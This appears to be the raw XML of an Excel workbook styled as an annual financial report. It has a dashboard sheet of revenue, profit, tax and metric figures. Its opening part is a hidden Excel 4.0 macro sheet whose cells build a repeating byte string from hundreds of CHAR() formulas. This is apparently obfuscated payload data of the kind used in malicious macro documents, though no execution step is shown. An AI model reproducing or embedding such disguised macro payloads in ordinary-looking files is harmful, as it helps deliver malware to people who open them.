        <f>CHAR(145)&amp;CHAR(91)&amp;CHAR(184)&amp;CHAR(244)&amp;CHAR(113)&amp;CHAR(122)&amp;CHAR(136)&amp;CHAR(234)&amp;CHAR(145)&amp;CHAR(91)</f>
        <v>‘[¸ôqzˆê‘[</v>
      </c>
    </row>
    <row r="639" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C639" t="str">
        <f>CHAR(184)&amp;CHAR(244)&amp;CHAR(113)&amp;CHAR(122)&amp;CHAR(136)&amp;CHAR(234)&amp;CHAR(145)&amp;CHAR(91)&amp;CHAR(184)&amp;CHAR(244)</f>
        <v>¸ôqzˆê‘[¸ô</v>
      </c>
    </row>
    <row r="640" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C640" t="str">
        <f>CHAR(113)&amp;CHAR(122)&amp;CHAR(136)&amp;CHAR(234)&amp;CHAR(145)&amp;CHAR(91)&amp;CHAR(184)&amp;CHAR(244)&amp;CHAR(113)&amp;CHAR(122)</f>
        <v>qzˆê‘[¸ôqz</v>
      </c>
    </row>
    <row r="641" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C641" t="str">
        <f>CHAR(136)&amp;CHAR(234)&amp;CHAR(145)&amp;CHAR(91)&amp;CHAR(184)&amp;CHAR(244)&amp;CHAR(113)&amp;CHAR(122)&amp;CHAR(136)&amp;CHAR(234)</f>
        <v>ˆê‘[¸ôqzˆê</v>
      </c>
    </row>
    <row r="642" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C642" t="str">
        <f>CHAR(145)&amp;CHAR(91)&amp;CHAR(184)&amp;CHAR(244)&amp;CHAR(113)&amp;CHAR(122)&amp;CHAR(136)&amp;CHAR(234)&amp;CHAR(145)&amp;CHAR(91)</f>
        <v>‘[¸ôqzˆê‘[</v>
      </c>
    </row>
    <row r="643" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C643" t="str">
        <f>CHAR(184)&amp;CHAR(244)&amp;CHAR(113)&amp;CHAR(122)&amp;CHAR(136)&amp;CHAR(234)&amp;CHAR(145)&amp;CHAR(91)&amp;CHAR(184)&amp;CHAR(244)</f>
        <v>¸ôqzˆê‘[¸ô</v>
      </c>
    </row>
    <row r="644" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C644" t="str">
        <f>CHAR(113)&amp;CHAR(122)&amp;CHAR(136)&amp;CHAR(234)&amp;CHAR(145)&amp;CHAR(91)&amp;CHAR(184)&amp;CHAR(244)&amp;CHAR(113)&amp;CHAR(122)</f>
        <v>qzˆê‘[¸ôqz</v>
      </c>
    </row>
    <row r="645" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C645" t="str">
        <f>CHAR(136)&amp;CHAR(234)&amp;CHAR(145)&amp;CHAR(91)&amp;CHAR(184)&amp;CHAR(244)&amp;CHAR(113)&amp;CHAR(122)&amp;CHAR(136)&amp;CHAR(234)</f>
        <v>ˆê‘[¸ôqzˆê</v>
      </c>
    </row>
    <row r="646" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C646" t="str">
        <f>CHAR(145)&amp;CHAR(91)&amp;CHAR(184)&amp;CHAR(244)&amp;CHAR(113)&amp;CHAR(122)&amp;CHAR(136)&amp;CHAR(234)&amp;CHAR(145)&amp;CHAR(91)</f>
        <v>‘[¸ôqzˆê‘[</v>
      </c>
    </row>
    <row r="647" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C647" t="str">
        <f>CHAR(184)&amp;CHAR(244)&amp;CHAR(113)&amp;CHAR(122)&amp;CHAR(136)&amp;CHAR(234)&amp;CHAR(145)&amp;CHAR(91)&amp;CHAR(184)&amp;CHAR(244)</f>
        <v>¸ôqzˆê‘[¸ô</v>
      </c>
    </row>
    <row r="648" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C648" t="str">
        <f>CHAR(113)&amp;CHAR(122)&amp;CHAR(136)&amp;CHAR(234)&amp;CHAR(145)&amp;CHAR(91)&amp;CHAR(184)&amp;CHAR(244)&amp;CHAR(113)&amp;CHAR(122)</f>
        <v>qzˆê‘[¸ôqz</v>
      </c>
    </row>
    <row r="649" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C649" t="str">
        <f>CHAR(136)&amp;CHAR(234)&amp;CHAR(145)&amp;CHAR(91)&amp;CHAR(184)&amp;CHAR(244)&amp;CHAR(113)&amp;CHAR(122)&amp;CHAR(136)&amp;CHAR(234)</f>
        <v>ˆê‘[¸ôqzˆê</v>
      </c>
    </row>
    <row r="650" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C650" t="str">
        <f>CHAR(145)&amp;CHAR(91)&amp;CHAR(184)&amp;CHAR(244)&amp;CHAR(113)&amp;CHAR(122)&amp;CHAR(136)&amp;CHAR(234)&amp;CHAR(145)&amp;CHAR(91)</f>
        <v>‘[¸ôqzˆê‘[</v>
      </c>
    </row>
    <row r="651" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C651" t="str">
        <f>CHAR(184)&amp;CHAR(244)&amp;CHAR(113)&amp;CHAR(122)&amp;CHAR(136)&amp;CHAR(234)&amp;CHAR(145)&amp;CHAR(91)&amp;CHAR(184)&amp;CHAR(244)</f>
        <v>¸ôqzˆê‘[¸ô</v>
      </c>
    </row>
    <row r="652" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C652" t="str">
        <f>CHAR(113)&amp;CHAR(122)&amp;CHAR(136)&amp;CHAR(234)&amp;CHAR(145)&amp;CHAR(91)&amp;CHAR(184)&amp;CHAR(244)&amp;CHAR(113)&amp;CHAR(122)</f>
        <v>qzˆê‘[¸ôqz</v>
      </c>
    </row>
    <row r="653" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C653" t="str">
        <f>CHAR(136)&amp;CHAR(234)&amp;CHAR(145)&amp;CHAR(91)&amp;CHAR(184)&amp;CHAR(244)&amp;CHAR(113)&amp;CHAR(122)&amp;CHAR(136)&amp;CHAR(234)</f>
        <v>ˆê‘[¸ôqzˆê</v>
      </c>
    </row>
    <row r="654" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C654" t="str">
        <f>CHAR(145)&amp;CHAR(91)&amp;CHAR(184)&amp;CHAR(244)&amp;CHAR(113)&amp;CHAR(122)&amp;CHAR(136)&amp;CHAR(234)&amp;CHAR(145)&amp;CHAR(91)</f>
        <v>‘[¸ôqzˆê‘[</v>
      </c>
    </row>
    <row r="655" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C655" t="str">
        <f>CHAR(184)&amp;CHAR(244)&amp;CHAR(113)&amp;CHAR(122)&amp;CHAR(136)&amp;CHAR(234)&amp;CHAR(145)&amp;CHAR(91)&amp;CHAR(184)&amp;CHAR(244)</f>
        <v>¸ôqzˆê‘[¸ô</v>
      </c>
    </row>
    <row r="656" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C656" t="str">
        <f>CHAR(113)&amp;CHAR(122)&amp;CHAR(136)&amp;CHAR(234)&amp;CHAR(145)&amp;CHAR(91)&amp;CHAR(184)&amp;CHAR(244)&amp;CHAR(113)&amp;CHAR(122)</f>
        <v>qzˆê‘[¸ôqz</v>
      </c>
    </row>
    <row r="657" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C657" t="str">
        <f>CHAR(136)&amp;CHAR(234)&amp;CHAR(145)&amp;CHAR(91)&amp;CHAR(184)&amp;CHAR(244)&amp;CHAR(113)&amp;CHAR(122)&amp;CHAR(136)&amp;CHAR(234)</f>
        <v>ˆê‘[¸ôqzˆê</v>
      </c>
    </row>
    <row r="658" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C658" t="str">
        <f>CHAR(145)&amp;CHAR(91)&amp;CHAR(184)&amp;CHAR(244)&amp;CHAR(113)&amp;CHAR(122)&amp;CHAR(136)&amp;CHAR(234)&amp;CHAR(145)&amp;CHAR(91)</f>
        <v>‘[¸ôqzˆê‘[</v>
      </c>
    </row>
    <row r="659" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C659" t="str">
        <f>CHAR(184)&amp;CHAR(244)&amp;CHAR(113)&amp;CHAR(122)&amp;CHAR(136)&amp;CHAR(234)&amp;CHAR(145)&amp;CHAR(91)&amp;CHAR(184)&amp;CHAR(244)</f>
        <v>¸ôqzˆê‘[¸ô</v>
      </c>
    </row>
    <row r="660" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C660" t="str">
        <f>CHAR(113)&amp;CHAR(122)&amp;CHAR(136)&amp;CHAR(234)&amp;CHAR(145)&amp;CHAR(91)&amp;CHAR(184)&amp;CHAR(244)&amp;CHAR(113)&amp;CHAR(122)</f>
        <v>qzˆê‘[¸ôqz</v>
      </c>
    </row>
    <row r="661" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C661" t="str">
        <f>CHAR(136)&amp;CHAR(234)&amp;CHAR(145)&amp;CHAR(91)&amp;CHAR(184)&amp;CHAR(244)&amp;CHAR(113)&amp;CHAR(122)&amp;CHAR(136)&amp;CHAR(234)</f>
        <v>ˆê‘[¸ôqzˆê</v>
      </c>
    </row>
    <row r="662" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C662" t="str">
        <f>CHAR(145)&amp;CHAR(91)&amp;CHAR(184)&amp;CHAR(244)&amp;CHAR(113)&amp;CHAR(122)&amp;CHAR(136)&amp;CHAR(234)&amp;CHAR(145)&amp;CHAR(91)</f>
        <v>‘[¸ôqzˆê‘[</v>
      </c>
    </row>
    <row r="663" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C663" t="str">
        <f>CHAR(184)&amp;CHAR(244)&amp;CHAR(113)&amp;CHAR(122)&amp;CHAR(136)&amp;CHAR(234)&amp;CHAR(145)&amp;CHAR(91)&amp;CHAR(184)&amp;CHAR(244)</f>
        <v>¸ôqzˆê‘[¸ô</v>
      </c>
    </row>
    <row r="664" spans="3:3" ht="28.5" x14ac:dyDescent="0.45">
      <c r="C664" t="str">
        <f>CHAR(113)&amp;CHAR(122)&amp;CHAR(136)&amp;CHAR(234)&amp;CHAR(145)&amp;CHAR(91)&amp;CHAR(184)&amp;CHAR(244)&amp;CHAR(113)</f>
        <v>qzˆê‘[¸ôq</v>
      </c>
    </row>
    <row r="665" spans="3:3" x14ac:dyDescent="0.45">
      <c r="C665" t="s">
        <v>37</v>
      </c>
    </row>
  </sheetData>
  <pageMargins left="0.7" right="0.7" top="0.75" bottom="0.75" header="0.3" footer="0.3"/>
  <pageSetup orientation="portrait" r:id="rId1"/>
</xm:macrosheet>
</file>

<file path=xl/theme/theme1.xml><?xml version="1.0" encoding="utf-8"?>
<a:theme xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" name="Office Theme">
  <a:themeElements>
    <a:clrScheme name="Annual Financial Report">
      <a:dk1>
        <a:sysClr val="windowText" lastClr="000000"/>
      </a:dk1>
      <a:lt1>
        <a:sysClr val="window" lastClr="FFFFFF"/>
      </a:lt1>
      <a:dk2>
        <a:srgbClr val="000000"/>
      </a:dk2>
      <a:lt2>
        <a:srgbClr val="E9EAEA"/>
      </a:lt2>
      <a:accent1>
        <a:srgbClr val="52B86E"/>
      </a:accent1>
      <a:accent2>
        <a:srgbClr val="F7901E"/>
      </a:accent2>
      <a:accent3>
        <a:srgbClr val="308DBB"/>
      </a:accent3>
      <a:accent4>
        <a:srgbClr val="EEB330"/>
      </a:accent4>
      <a:accent5>
        <a:srgbClr val="915B97"/>
      </a:accent5>
      <a:accent6>
        <a:srgbClr val="E35856"/>
      </a:accent6>
      <a:hlink>
        <a:srgbClr val="308DBB"/>
      </a:hlink>
      <a:folHlink>
        <a:srgbClr val="915B97"/>
      </a:folHlink>
    </a:clrScheme>
    <a:fontScheme name="Annual Financial Report">
      <a:majorFont>
        <a:latin typeface="Trebuchet MS"/>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N40"/>
  <sheetViews>
    <sheetView showGridLines="0" tabSelected="1" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="O8" sqref="O8"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultColWidth="8.796875" defaultRowHeight="30" customHeight="1" x14ac:dyDescent="0.45"/>
  <cols>
    <col min="1" max="1" width="1.6640625" customWidth="1"/>
    <col min="2" max="2" width="26.33203125" customWidth="1"/>
    <col min="3" max="3" width="2.6640625" customWidth="1"/>
    <col min="4" max="4" width="26.33203125" customWidth="1"/>
    <col min="5" max="5" width="2.6640625" customWidth="1"/>
    <col min="6" max="6" width="26.33203125" customWidth="1"/>
    <col min="7" max="7" width="2.6640625" customWidth="1"/>
    <col min="8" max="8" width="26.33203125" customWidth="1"/>
    <col min="9" max="9" width="2.6640625" customWidth="1"/>
    <col min="10" max="10" width="12.1328125" customWidth="1"/>
    <col min="11" max="11" width="1.6640625" customWidth="1"/>
    <col min="12" max="12" width="12.1328125" customWidth="1"/>
    <col min="13" max="13" width="1.6640625" customWidth="1"/>
    <col min="14" max="14" width="17.6640625" customWidth="1"/>
    <col min="15" max="15" width="10" customWidth="1"/>
    <col min="16" max="18" width="10"/>
  </cols>
  <sheetData>
    <row r="1" spans="2:14" ht="8.25" customHeight="1" thickBot="1" x14ac:dyDescent="0.5">
      <c r="B1" s="63" t="s">
        <v>0</v>
      </c>
      <c r="C1" s="63"/>
      <c r="D1" s="63"/>
      <c r="E1" s="63"/>
      <c r="F1" s="63"/>
      <c r="G1" s="63"/>
      <c r="H1" s="63"/>
      <c r="I1" s="63"/>
      <c r="J1" s="63"/>
      <c r="K1" s="21"/>
      <c r="L1" s="21"/>
    </row>
    <row r="2" spans="2:14" ht="38.25" customHeight="1" thickBot="1" x14ac:dyDescent="0.5">
      <c r="B2" s="63"/>
      <c r="C2" s="63"/>
      <c r="D2" s="63"/>
      <c r="E2" s="63"/>
      <c r="F2" s="63"/>
      <c r="G2" s="63"/>
      <c r="H2" s="63"/>
      <c r="I2" s="63"/>
      <c r="J2" s="63"/>
      <c r="K2" s="66">
        <v>2018</v>
      </c>
      <c r="L2" s="66"/>
      <c r="N2" s="54" t="s">
        <v>35</v>
      </c>
    </row>
    <row r="3" spans="2:14" ht="63.75" customHeight="1" thickBot="1" x14ac:dyDescent="0.5">
      <c r="B3" s="64" t="s">
        <v>36</v>
      </c>
      <c r="C3" s="64"/>
      <c r="D3" s="64"/>
      <c r="E3" s="64"/>
      <c r="F3" s="64"/>
      <c r="G3" s="64"/>
      <c r="H3" s="64"/>
      <c r="I3" s="64"/>
      <c r="J3" s="64"/>
      <c r="K3" s="64"/>
      <c r="L3" s="64"/>
      <c r="N3" s="54" t="s">
        <v>30</v>
      </c>
    </row>
    <row r="4" spans="2:14" ht="6.75" customHeight="1" thickBot="1" x14ac:dyDescent="0.5">
      <c r="B4" s="65"/>
      <c r="C4" s="65"/>
      <c r="D4" s="65"/>
      <c r="E4" s="65"/>
      <c r="F4" s="65"/>
      <c r="G4" s="65"/>
      <c r="H4" s="65"/>
      <c r="I4" s="65"/>
      <c r="J4" s="65"/>
      <c r="K4" s="65"/>
      <c r="L4" s="65"/>
    </row>
    <row r="5" spans="2:14" ht="24" customHeight="1" thickBot="1" x14ac:dyDescent="0.5">
      <c r="B5" s="79" t="s">
        <v>1</v>
      </c>
      <c r="C5" s="79"/>
      <c r="D5" s="62" t="s">
        <v>32</v>
      </c>
      <c r="E5" s="62"/>
      <c r="F5" s="62"/>
      <c r="G5" s="62"/>
      <c r="H5" s="62"/>
      <c r="I5" s="62"/>
      <c r="J5" s="62"/>
      <c r="K5" s="62"/>
      <c r="L5" s="62"/>
    </row>
    <row r="6" spans="2:14" s="9" customFormat="1" ht="18.75" customHeight="1" thickBot="1" x14ac:dyDescent="0.5">
      <c r="B6" s="22"/>
      <c r="C6" s="22"/>
      <c r="D6" s="34"/>
      <c r="E6" s="22"/>
      <c r="F6" s="22"/>
      <c r="G6" s="22"/>
      <c r="H6" s="22"/>
      <c r="I6" s="22"/>
      <c r="J6" s="88"/>
      <c r="K6" s="88"/>
      <c r="L6" s="88"/>
    </row>
    <row r="7" spans="2:14" ht="22.5" customHeight="1" x14ac:dyDescent="0.4">
      <c r="B7" s="32" t="str">
        <f>Calculations!B8</f>
        <v>REVENUES</v>
      </c>
      <c r="C7" s="23"/>
      <c r="D7" s="33" t="str">
        <f>Calculations!B9</f>
        <v>NET PROFIT</v>
      </c>
      <c r="E7" s="23"/>
      <c r="F7" s="33" t="str">
        <f>Calculations!B10</f>
        <v>INTEREST</v>
      </c>
      <c r="G7" s="23"/>
      <c r="H7" s="33" t="str">
        <f>Calculations!B11</f>
        <v>DEPRECIATION</v>
      </c>
      <c r="I7" s="23"/>
      <c r="J7" s="76" t="str">
        <f>Calculations!B12</f>
        <v>OPERATING PROFIT</v>
      </c>
      <c r="K7" s="77"/>
      <c r="L7" s="78"/>
      <c r="M7" s="8"/>
    </row>
    <row r="8" spans="2:14" ht="42" customHeight="1" x14ac:dyDescent="0.45">
      <c r="B8" s="29">
        <f ca="1">IFERROR(Calculations!G8,"")</f>
        <v>165044.56</v>
      </c>
      <c r="C8" s="21"/>
      <c r="D8" s="29">
        <f ca="1">IFERROR(Calculations!G9,"")</f>
        <v>61483.59</v>
      </c>
      <c r="E8" s="21"/>
      <c r="F8" s="29">
        <f ca="1">IFERROR(Calculations!G10,"")</f>
        <v>3148.53</v>
      </c>
      <c r="G8" s="21"/>
      <c r="H8" s="28">
        <f ca="1">IFERROR(Calculations!G11,"")</f>
        <v>5024.1099999999997</v>
      </c>
      <c r="I8" s="24"/>
      <c r="J8" s="70">
        <f ca="1">IFERROR(Calculations!G12,"")</f>
        <v>76755.259999999995</v>
      </c>
      <c r="K8" s="71"/>
      <c r="L8" s="72"/>
    </row>
    <row r="9" spans="2:14" s="4" customFormat="1" ht="18.75" customHeight="1" x14ac:dyDescent="0.45">
      <c r="B9" s="31">
        <f ca="1">Calculations!H8</f>
        <v>9.5277337609911417E-2</v>
      </c>
      <c r="C9" s="21"/>
      <c r="D9" s="30">
        <f ca="1">Calculations!H9</f>
        <v>2.9049364873606542E-2</v>
      </c>
      <c r="E9" s="21"/>
      <c r="F9" s="30">
        <f ca="1">Calculations!H10</f>
        <v>3.9571189877938284E-3</v>
      </c>
      <c r="G9" s="21"/>
      <c r="H9" s="30">
        <f ca="1">Calculations!H11</f>
        <v>1.0031743734180809E-2</v>
      </c>
      <c r="I9" s="21"/>
      <c r="J9" s="67">
        <f ca="1">Calculations!H12</f>
        <v>1.4700716851800966E-2</v>
      </c>
      <c r="K9" s="68"/>
      <c r="L9" s="69"/>
      <c r="M9" s="5"/>
    </row>
    <row r="10" spans="2:14" ht="18.75" customHeight="1" x14ac:dyDescent="0.45">
      <c r="B10" s="25"/>
      <c r="C10" s="55"/>
      <c r="D10" s="25"/>
      <c r="E10" s="21"/>
      <c r="F10" s="25"/>
      <c r="G10" s="56"/>
      <c r="H10" s="26"/>
      <c r="I10" s="57"/>
      <c r="J10" s="73"/>
      <c r="K10" s="74"/>
      <c r="L10" s="75"/>
      <c r="M10" s="6"/>
    </row>
    <row r="11" spans="2:14" ht="18.75" customHeight="1" thickBot="1" x14ac:dyDescent="0.5">
      <c r="B11" s="27"/>
      <c r="C11" s="21"/>
      <c r="D11" s="27"/>
      <c r="E11" s="21"/>
      <c r="F11" s="27"/>
      <c r="G11" s="21"/>
      <c r="H11" s="27"/>
      <c r="I11" s="21"/>
      <c r="J11" s="89"/>
      <c r="K11" s="90"/>
      <c r="L11" s="91"/>
    </row>
    <row r="12" spans="2:14" ht="18.75" customHeight="1" thickBot="1" x14ac:dyDescent="0.5">
      <c r="B12" s="21"/>
      <c r="C12" s="21"/>
      <c r="D12" s="21"/>
      <c r="E12" s="21"/>
      <c r="F12" s="21"/>
      <c r="G12" s="21"/>
      <c r="H12" s="21"/>
      <c r="I12" s="21"/>
      <c r="J12" s="21"/>
      <c r="K12" s="21"/>
      <c r="L12" s="21"/>
    </row>
    <row r="13" spans="2:14" ht="24" customHeight="1" thickBot="1" x14ac:dyDescent="0.5">
      <c r="B13" s="61" t="s">
        <v>2</v>
      </c>
      <c r="C13" s="61"/>
      <c r="D13" s="62" t="s">
        <v>31</v>
      </c>
      <c r="E13" s="62"/>
      <c r="F13" s="62"/>
      <c r="G13" s="62"/>
      <c r="H13" s="62"/>
      <c r="I13" s="62"/>
      <c r="J13" s="62"/>
      <c r="K13" s="62"/>
      <c r="L13" s="62"/>
    </row>
    <row r="14" spans="2:14" ht="18.75" customHeight="1" x14ac:dyDescent="0.45">
      <c r="B14" s="92"/>
      <c r="C14" s="92"/>
      <c r="D14" s="92"/>
      <c r="E14" s="92"/>
      <c r="F14" s="92"/>
      <c r="G14" s="92"/>
      <c r="H14" s="92"/>
      <c r="I14" s="92"/>
      <c r="J14" s="92"/>
      <c r="K14" s="92"/>
      <c r="L14" s="92"/>
    </row>
    <row r="15" spans="2:14" ht="18.75" customHeight="1" x14ac:dyDescent="0.45">
      <c r="B15" s="80" t="s">
        <v>3</v>
      </c>
      <c r="C15" s="80"/>
      <c r="D15" s="45" t="str">
        <f>"REPORT YEAR ("&amp;SelectedYear&amp;")"</f>
        <v>REPORT YEAR (2018)</v>
      </c>
      <c r="E15" s="87" t="str">
        <f>"PREVIOUS YEAR ("&amp;SelectedYear-1&amp;")"</f>
        <v>PREVIOUS YEAR (2017)</v>
      </c>
      <c r="F15" s="87"/>
      <c r="G15" s="87"/>
      <c r="H15" s="46" t="s">
        <v>4</v>
      </c>
      <c r="I15" s="83" t="str">
        <f ca="1">CONCATENATE(Years," YEAR TREND")</f>
        <v>5 YEAR TREND</v>
      </c>
      <c r="J15" s="83"/>
      <c r="K15" s="83"/>
      <c r="L15" s="83"/>
    </row>
    <row r="16" spans="2:14" ht="30" customHeight="1" x14ac:dyDescent="0.45">
      <c r="B16" s="81" t="str">
        <f>Calculations!B15</f>
        <v>REVENUES</v>
      </c>
      <c r="C16" s="81"/>
      <c r="D16" s="47">
        <f ca="1">IF($B16="","",Calculations!G15)</f>
        <v>165044.56</v>
      </c>
      <c r="E16" s="93">
        <f ca="1">IF($B16="","",Calculations!F15)</f>
        <v>150687.46</v>
      </c>
      <c r="F16" s="93"/>
      <c r="G16" s="93"/>
      <c r="H16" s="48">
        <f t="shared" ref="H16:H40" ca="1" si="0">IFERROR(D16/E16-1,"")</f>
        <v>9.5277337609911417E-2</v>
      </c>
      <c r="I16" s="60"/>
      <c r="J16" s="60"/>
      <c r="K16" s="60"/>
      <c r="L16" s="60"/>
    </row>
    <row r="17" spans="2:12" ht="30" customHeight="1" x14ac:dyDescent="0.45">
      <c r="B17" s="82" t="str">
        <f>Calculations!B16</f>
        <v>OPERATING EXPENSES</v>
      </c>
      <c r="C17" s="82"/>
      <c r="D17" s="15">
        <f ca="1">IF($B17="","",Calculations!G16)</f>
        <v>81674.37</v>
      </c>
      <c r="E17" s="85">
        <f ca="1">IF($B17="","",Calculations!F16)</f>
        <v>78901.27</v>
      </c>
      <c r="F17" s="85"/>
      <c r="G17" s="85"/>
      <c r="H17" s="10">
        <f t="shared" ca="1" si="0"/>
        <v>3.5146455817504529E-2</v>
      </c>
      <c r="I17" s="58"/>
      <c r="J17" s="58"/>
      <c r="K17" s="58"/>
      <c r="L17" s="58"/>
    </row>
    <row r="18" spans="2:12" ht="30" customHeight="1" x14ac:dyDescent="0.45">
      <c r="B18" s="82" t="str">
        <f>Calculations!B17</f>
        <v>OPERATING PROFIT</v>
      </c>
      <c r="C18" s="82"/>
      <c r="D18" s="15">
        <f ca="1">IF($B18="","",Calculations!G17)</f>
        <v>76755.259999999995</v>
      </c>
      <c r="E18" s="85">
        <f ca="1">IF($B18="","",Calculations!F17)</f>
        <v>75643.25</v>
      </c>
      <c r="F18" s="85"/>
      <c r="G18" s="85"/>
      <c r="H18" s="10">
        <f t="shared" ca="1" si="0"/>
        <v>1.4700716851800966E-2</v>
      </c>
      <c r="I18" s="58"/>
      <c r="J18" s="58"/>
      <c r="K18" s="58"/>
      <c r="L18" s="58"/>
    </row>
    <row r="19" spans="2:12" ht="30" customHeight="1" x14ac:dyDescent="0.45">
      <c r="B19" s="82" t="str">
        <f>Calculations!B18</f>
        <v>DEPRECIATION</v>
      </c>
      <c r="C19" s="82"/>
      <c r="D19" s="15">
        <f ca="1">IF($B19="","",Calculations!G18)</f>
        <v>5024.1099999999997</v>
      </c>
      <c r="E19" s="85">
        <f ca="1">IF($B19="","",Calculations!F18)</f>
        <v>4974.21</v>
      </c>
      <c r="F19" s="85"/>
      <c r="G19" s="85"/>
      <c r="H19" s="10">
        <f t="shared" ca="1" si="0"/>
        <v>1.0031743734180809E-2</v>
      </c>
      <c r="I19" s="58"/>
      <c r="J19" s="58"/>
      <c r="K19" s="58"/>
      <c r="L19" s="58"/>
    </row>
    <row r="20" spans="2:12" ht="30" customHeight="1" x14ac:dyDescent="0.45">
      <c r="B20" s="82" t="str">
        <f>Calculations!B19</f>
        <v>INTEREST</v>
      </c>
      <c r="C20" s="82"/>
      <c r="D20" s="15">
        <f ca="1">IF($B20="","",Calculations!G19)</f>
        <v>3148.53</v>
      </c>
      <c r="E20" s="85">
        <f ca="1">IF($B20="","",Calculations!F19)</f>
        <v>3136.12</v>
      </c>
      <c r="F20" s="85"/>
      <c r="G20" s="85"/>
      <c r="H20" s="10">
        <f t="shared" ca="1" si="0"/>
        <v>3.9571189877938284E-3</v>
      </c>
      <c r="I20" s="58"/>
      <c r="J20" s="58"/>
      <c r="K20" s="58"/>
      <c r="L20" s="58"/>
    </row>
    <row r="21" spans="2:12" ht="30" customHeight="1" x14ac:dyDescent="0.45">
      <c r="B21" s="82" t="str">
        <f>Calculations!B20</f>
        <v>NET PROFIT</v>
      </c>
      <c r="C21" s="82"/>
      <c r="D21" s="15">
        <f ca="1">IF($B21="","",Calculations!G20)</f>
        <v>61483.59</v>
      </c>
      <c r="E21" s="85">
        <f ca="1">IF($B21="","",Calculations!F20)</f>
        <v>59747.95</v>
      </c>
      <c r="F21" s="85"/>
      <c r="G21" s="85"/>
      <c r="H21" s="10">
        <f t="shared" ca="1" si="0"/>
        <v>2.9049364873606542E-2</v>
      </c>
      <c r="I21" s="58"/>
      <c r="J21" s="58"/>
      <c r="K21" s="58"/>
      <c r="L21" s="58"/>
    </row>
    <row r="22" spans="2:12" ht="30" customHeight="1" x14ac:dyDescent="0.45">
      <c r="B22" s="82" t="str">
        <f>Calculations!B21</f>
        <v>TAX</v>
      </c>
      <c r="C22" s="82"/>
      <c r="D22" s="15">
        <f ca="1">IF($B22="","",Calculations!G21)</f>
        <v>28335.67</v>
      </c>
      <c r="E22" s="85">
        <f ca="1">IF($B22="","",Calculations!F21)</f>
        <v>27498.86</v>
      </c>
      <c r="F22" s="85"/>
      <c r="G22" s="85"/>
      <c r="H22" s="10">
        <f t="shared" ca="1" si="0"/>
        <v>3.0430716036955685E-2</v>
      </c>
      <c r="I22" s="58"/>
      <c r="J22" s="58"/>
      <c r="K22" s="58"/>
      <c r="L22" s="58"/>
    </row>
    <row r="23" spans="2:12" ht="30" customHeight="1" x14ac:dyDescent="0.45">
      <c r="B23" s="82" t="str">
        <f>Calculations!B22</f>
        <v>PROFIT AFTER TAX</v>
      </c>
      <c r="C23" s="82"/>
      <c r="D23" s="15">
        <f ca="1">IF($B23="","",Calculations!G22)</f>
        <v>40607.730000000003</v>
      </c>
      <c r="E23" s="85">
        <f ca="1">IF($B23="","",Calculations!F22)</f>
        <v>39895.050000000003</v>
      </c>
      <c r="F23" s="85"/>
      <c r="G23" s="85"/>
      <c r="H23" s="10">
        <f t="shared" ca="1" si="0"/>
        <v>1.7863870329777765E-2</v>
      </c>
      <c r="I23" s="58"/>
      <c r="J23" s="58"/>
      <c r="K23" s="58"/>
      <c r="L23" s="58"/>
    </row>
    <row r="24" spans="2:12" ht="30" customHeight="1" x14ac:dyDescent="0.45">
      <c r="B24" s="82" t="str">
        <f>Calculations!B23</f>
        <v>METRIC 1</v>
      </c>
      <c r="C24" s="82"/>
      <c r="D24" s="15">
        <f ca="1">IF($B24="","",Calculations!G23)</f>
        <v>15.57</v>
      </c>
      <c r="E24" s="85">
        <f ca="1">IF($B24="","",Calculations!F23)</f>
        <v>14.29</v>
      </c>
      <c r="F24" s="85"/>
      <c r="G24" s="85"/>
      <c r="H24" s="10">
        <f t="shared" ca="1" si="0"/>
        <v>8.9573128061581686E-2</v>
      </c>
      <c r="I24" s="58"/>
      <c r="J24" s="58"/>
      <c r="K24" s="58"/>
      <c r="L24" s="58"/>
    </row>
    <row r="25" spans="2:12" ht="30" customHeight="1" x14ac:dyDescent="0.45">
      <c r="B25" s="82" t="str">
        <f>Calculations!B24</f>
        <v>METRIC 2</v>
      </c>
      <c r="C25" s="82"/>
      <c r="D25" s="15">
        <f ca="1">IF($B25="","",Calculations!G24)</f>
        <v>20.48</v>
      </c>
      <c r="E25" s="85">
        <f ca="1">IF($B25="","",Calculations!F24)</f>
        <v>20.170000000000002</v>
      </c>
      <c r="F25" s="85"/>
      <c r="G25" s="85"/>
      <c r="H25" s="10">
        <f t="shared" ca="1" si="0"/>
        <v>1.5369360436291446E-2</v>
      </c>
      <c r="I25" s="58"/>
      <c r="J25" s="58"/>
      <c r="K25" s="58"/>
      <c r="L25" s="58"/>
    </row>
    <row r="26" spans="2:12" ht="30" customHeight="1" x14ac:dyDescent="0.45">
      <c r="B26" s="82" t="str">
        <f>Calculations!B25</f>
        <v>METRIC 3</v>
      </c>
      <c r="C26" s="82"/>
      <c r="D26" s="15">
        <f ca="1">IF($B26="","",Calculations!G25)</f>
        <v>24.67</v>
      </c>
